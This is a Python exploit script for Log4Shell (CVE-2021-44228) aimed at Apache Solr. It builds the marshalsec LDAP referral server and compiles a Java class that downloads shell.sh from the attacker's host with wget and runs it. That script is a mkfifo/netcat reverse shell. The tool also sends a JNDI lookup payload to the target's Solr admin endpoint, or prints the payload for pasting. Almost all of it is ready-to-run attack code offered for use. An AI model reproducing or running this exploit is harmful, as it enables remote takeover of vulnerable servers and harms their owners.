# Made by @CaraTortu (06/05/2022)
# CVE-2021-44228

import os, threading, requests, time
from os.path import exists

def installMarshall():
    if not exists("marshalsec.jar"):
        os.system("git clone https://github.com/mbechler/marshalsec.git")
        os.chdir("marshalsec")
        os.system("mvn clean package -DskipTests")
        os.system("cp target/marshalsec*.jar ../")
        os.chdir("..")
        os.system("rm -rf marshalsec *SNAPSHOT.jar")
        os.system("mv * marshalsec.jar")
        print("\033[92m[+]\033[00m Marshall installed, running...")
    else:
        print("\033[92m[+]\033[00m Marshall is already installed, running...")
    exploit()


def LDAPExploit(ip):
    print("\033[92m[+]\033[00m LDAP listener started...")
    os.system(f"java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \"http://{ip}:8000/#Exploit\"")

def httpServer():
    print("\033[92m[+]\033[00m HTTP server started...")
    os.system("python3 -m http.server 8000")

def generateExploit(ip, port):
    expl = """
public class Exploit {
    public static void main(String[] args) {
        try {
            String step1[] = {"wget", "http://%s:8000/shell.sh"};
            String step2[] = {"bash","shell.sh"};
            Runtime.getRuntime().exec((String[]) step1);
            Runtime.getRuntime().exec((String[]) step2);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}

    """ % (ip)

    with open("Exploit.java", "w") as f:
        f.write(expl)
    
    os.system("javac Exploit.java")
    os.system(f"""echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f" > shell.sh""")
    print("\033[92m[+]\033[00m Exploit generated, waiting for threads to finish and execute a shell...")

def triggerExploit(ip, target, action):
    if action == "n":
        url = "http://%s:8983/solr/admin/cores?foo=${jndi:ldap://%s:1389/Exploit}" % (target, ip)
        requests.get(url)
        print("\033[92m[+]\033[00m Exploit triggered, you should have gotten a reverse shell!")
    else:
        print("\n\033[92m[+]\033[00m Paste this payload and enjoy your shell!: \033[94m${jndi:ldap://%s:1389/Exploit}\033[00m" % ip)

def setup():
    os.system("mkdir src")
    os.chdir("src")
    installMarshall()

def exploit():
    ip = input("Enter the IP address you want to listen on: ")
    port = input("Enter the port for the reverse shell: ")
    action = input("Do you want to just print the payload? [y/n]: ")
    target = ""
    if action == "n":
        target = input("Enter the target IP address: ")

    threading.Thread(target=LDAPExploit, args=(ip,)).start()
    time.sleep(1)
    threading.Thread(target=generateExploit, args=(ip, port)).start()
    threading.Thread(target=httpServer).start()
    time.sleep(10 if action == "n" else 1)
    threading.Thread(target=triggerExploit, args=(ip, target, action)).start()

if __name__ == "__main__":
    setup()
